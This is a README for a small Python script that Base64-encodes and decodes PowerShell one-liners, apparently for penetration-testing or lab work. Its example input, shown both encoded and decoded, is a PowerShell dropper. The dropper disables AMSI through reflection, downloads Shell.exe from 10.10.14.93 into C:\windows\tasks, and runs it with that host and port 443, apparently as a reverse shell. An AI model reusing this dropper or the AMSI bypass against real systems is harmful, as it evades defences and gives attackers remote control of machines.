# PowerShell Encoder
A very simple python script to encode and decode PowerShell one-liners.

I used [Raikia's PowerShell encoder](https://raikia.com/tool-powershell-encoder/]) ALOT, but one day it went down, and I was sad! So I created this simple script that I could run on Linux.

## Usage

Show the help:

```
./ps-encoder.py                                  
Usage: ./ps-encoder.py [OPTION]... [FILE]
PowerShell Base64 encode or decode FILE, or standard input, to standard output.

With no FILE provided as the second argument, the second argument will be encoded or decoded

  -d, --decode      decode the powershell FILE or argument.
  -e, --encode      encode the powershell FILE or argument.
  -h, --help        display this help and exit.

 If you want to ouput to a file use the stdout > operator.
```

## Examples

### Encode

Encode a PowerShell dropper file:

```
./ps-encoder.py -e dropper.txt                    
powershell.exe -exec bypass -enc JABhACAAPQAgAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAcwAoACkAOwBGAG8AcgBFAGEAYwBoACgAJABiACAAaQBuACAAJABhACkAIAB7AGkAZgAgACgAJABiAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACIAKgBpAHUAdABpAGwAcwAiACkAIAB7ACQAYwAgAD0AIAAkAGIAfQB9ADsAJABkACAAPQAgACQAYwAuAEcAZQB0AEYAaQBlAGwAZABzACgAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEYAbwByAEUAYQBjAGgAKAAkAGUAIABpAG4AIAAkAGQAKQAgAHsAaQBmACAAKAAkAGUALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAGkAdABGAGEAaQBsAGUAZAAiACkAIAB7ACQAZgAgAD0AIAAkAGUAfQB9ADsAJABmAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOQAzAC8AUwBoAGUAbABsAC4AZQB4AGUAIgAsACAAIgBDADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAUwBoAGUAbABsAC4AZQB4AGUAIgApADsACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXABTAGgAZQBsAGwALgBlAHgAZQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAzACAANAA0ADMAIgA7AAoA
```

To file:

```
./ps-encoder.py -e dropper.txt > encoded-dropper.txt
```

### Decode

Decode a PowerShell dropper:

```
./ps-encoder.py -d JABhACAAPQAgAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAcwAoACkAOwBGAG8AcgBFAGEAYwBoACgAJABiACAAaQBuACAAJABhACkAIAB7AGkAZgAgACgAJABiAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACIAKgBpAHUAdABpAGwAcwAiACkAIAB7ACQAYwAgAD0AIAAkAGIAfQB9ADsAJABkACAAPQAgACQAYwAuAEcAZQB0AEYAaQBlAGwAZABzACgAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEYAbwByAEUAYQBjAGgAKAAkAGUAIABpAG4AIAAkAGQAKQAgAHsAaQBmACAAKAAkAGUALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAGkAdABGAGEAaQBsAGUAZAAiACkAIAB7ACQAZgAgAD0AIAAkAGUAfQB9ADsAJABmAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOQAzAC8AUwBoAGUAbABsAC4AZQB4AGUAIgAsACAAIgBDADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAUwBoAGUAbABsAC4AZQB4AGUAIgApADsACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXABTAGgAZQBsAGwALgBlAHgAZQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAzACAANAA0ADMAIgA7AAoA
$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true);
(new-object system.net.webclient).downloadfile("http://10.10.14.93/Shell.exe", "C:\windows\tasks\Shell.exe");
Start-Process -FilePath "C:\Windows\Tasks\Shell.exe" -ArgumentList "10.10.14.93 443";
```

To file:

```
./ps-encoder.py -d encoded-dropper.txt > dropper.txt
```
